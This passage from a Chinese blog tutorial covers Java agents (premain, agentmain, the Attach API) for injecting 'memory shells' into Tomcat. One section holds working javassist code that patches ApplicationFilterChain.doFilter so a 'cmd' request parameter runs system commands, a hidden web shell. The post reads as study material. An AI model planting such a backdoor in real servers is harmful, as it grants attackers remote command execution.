class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>简单讲一下 addTransformer，getAllLoadedClasses，retransformClasses 三个方法的作用</p>
+<h5 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses"></a>getAllLoadedClasses</h5><p>getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class。</p>
+<h5 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses"></a>retransformClasses</h5><p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果。</p>
+<h5 id="addTransformer-Demo"><a href="#addTransformer-Demo" class="headerlink" title="addTransformer-Demo"></a>addTransformer-Demo</h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器。如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
+<p>写个简单的测试</p>
+<p><strong>MainDemo.java</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I&#x27;m Main!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>PremainDemo.java</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PremainDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建类转换器实例</span></span><br><span class="line">        <span class="type">PremainDemo</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PremainDemo</span>();</span><br><span class="line">        inst.addTransformer(transformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里实现了 ClassFileTransformer 接口并自定义了 transform 方法，主要作用是输出被拦截的类名。</p>
+<p><strong>Test.java</strong> </p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Attributes;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Manifest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        makePremainJar(MainDemo.class,<span class="string">&quot;I_main.jar&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        makePremainJar(PremainDemo.class,<span class="string">&quot;I_premain.jar&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;premain/src/main/java/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName().replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            <span class="comment">// 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Redefine-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Retransform-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置 Premain-Class</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Premain-Class&quot;</span>), compileClass.getName());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">            System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>本类将上面的两个 java 处理为 jar 文件，并设置好 manifest 的内容，启动后可以发现输出了很多内容，我们也可以写一个简单的 spring 服务，通过 premain 的方式注入自己的 filter 内容（以 filter 为例）</p>
+<h5 id="addTransformer-注入内存马"><a href="#addTransformer-注入内存马" class="headerlink" title="addTransformer-注入内存马"></a>addTransformer-注入内存马</h5><p>通过之前对内存马的学习， <code>org.apache.catalina.core.ApplicationFilterChain</code>下的 <code>internalDoFilter</code> 或者 <code>doFilter</code> 方法</p>
+<p>都拥有<code>Request</code>和<code>Response</code>参数，修改一个就可以控制所有的请求与响应。</p>
+<p>这里使用 javassist 对被拦截的类方法进行修改，修改如下：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PremainDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建类转换器实例</span></span><br><span class="line">        <span class="type">PremainDemo</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PremainDemo</span>();</span><br><span class="line">        inst.addTransformer(transformer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="comment">// 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错</span></span><br><span class="line">            pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>随后将该内容打 jar 包，之后将其启动</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-javaagent</span>:I_premain.jar <span class="literal">-jar</span> SpringDemo.jar</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240311154518684.png"
+                      alt="image-20240311154518684"
+                ></p>
+<p>发现注入成功。</p>
+<h3 id="agentmain-启动后加载-agent"><a href="#agentmain-启动后加载-agent" class="headerlink" title="agentmain-启动后加载 agent"></a>agentmain-启动后加载 agent</h3><p>我们内存马注入的情况都是处于 JVM 已运行了的情况，所以上面的方法就不是很有用，不过在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent ，然而 Attach API 在 tool.jar 中，jvm 启动时是默认不加载该依赖的，需要我们在 classpath 中额外进行指定</p>
+<p>启动后加载 agent 通过新的代理操作来实现：agentmain，使得可以在 main 函数开始运行之后再运行</p>
+<p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure></div>
+
+<p>要求和之前类似，这里我们去实现 agentmain 方法，还要在<code>META-INF/MANIFEST.MF</code>中加入<code>Agent-Class</code></p>
+<p>Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code> 包里面。着重关注的是<code>VitualMachine</code>这个类。</p>
+<p>（所以记得导入本地的 tools.jar 作为依赖）</p>
+<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title function_">list</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title function_">attach</span><span class="params">(String id)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadAgent</span><span class="params">(String agent)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
+<h4 id="获取Java程序进程"><a href="#获取Java程序进程" class="headerlink" title="获取Java程序进程"></a>获取Java程序进程</h4><p>可以使用自带的 <code>jps -l</code> 命令去查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240311214358589.png"
+                      alt="image-20240311214358589"
+                ></p>
+<p>也可以通过代码去获取</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">       <span class="keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : list) &#123;</span><br><span class="line">           System.out.println(virtualMachineDescriptor+<span class="string">&quot;\n&quot;</span>+virtualMachineDescriptor.id());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>知道上面的内容后，就可以自己简单写个项目手动为其添加 agent.jar</p>
+<p>先写个 ClassFileTransformer 的实现类，并自定义实现 transform  方法</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;加载类：&quot;</span>+className);</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>打 jar 包</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_Maker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        makePremainJar(AgentDemo.class,<span class="string">&quot;agentmain.jar&quot;</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, String libPath, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;agentmain/src/main/java/Demo/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName().replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            <span class="comment">// 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Redefine-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Retransform-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置 Premain-Class</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Agent-Class&quot;</span>), 